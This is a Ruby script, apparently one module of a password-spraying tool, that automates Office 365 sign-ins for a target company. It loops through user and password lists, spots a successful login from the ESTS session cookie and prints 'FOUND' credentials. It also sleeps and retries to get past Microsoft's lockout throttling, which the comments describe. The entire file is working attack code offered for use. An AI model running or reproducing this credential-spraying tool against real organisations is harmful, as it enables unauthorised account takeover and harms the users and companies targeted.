require_relative '../lib/core'

COMPANY = "example"

class Office365 < DoubleTap

  def initialize
    super
    @url = "http://autodiscover.#{COMPANY}.com"
    @jitter = { min: 15, max: 30 }
    @fault_sleep = 300
  end

  def login_flow(user:, pass:)
    visit_site
    fill_in(form_field_name: 'loginfmt', value: user)
    click_button(button_name: 'Next')
    fill_in(form_field_name: 'passwd', value: pass)
    click_button(button_name: 'Sign in')
  end

  def valid_login?
    @browser.response_headers['Set-Cookie'] =~ /ESTS/
  end

  # Overrides inheritted DoubleTap#spray! method
  def spray!
    @passwords.each do |pass|
      @users.each do |username|
        puts "Trying #{username} with password: #{pass}" if VERBOSE
        begin
          # O365 throttle after 10 failed attempt from the same IP, even with jitter
          # Seems to reset some time under 5 minutts
          login_flow(user: username, pass: pass)
        rescue Exception => err
          puts err
          puts 'Error submitting request'
          puts "Sleeping #{@fault_sleep} in case occured as a result of throttling"
          sleep @fault_sleep
          redo
        end
        puts "FOUND: #{username}:#{pass}" if valid_login?
        new_session!
      end
    end
  end
end

Office365.new.spray!
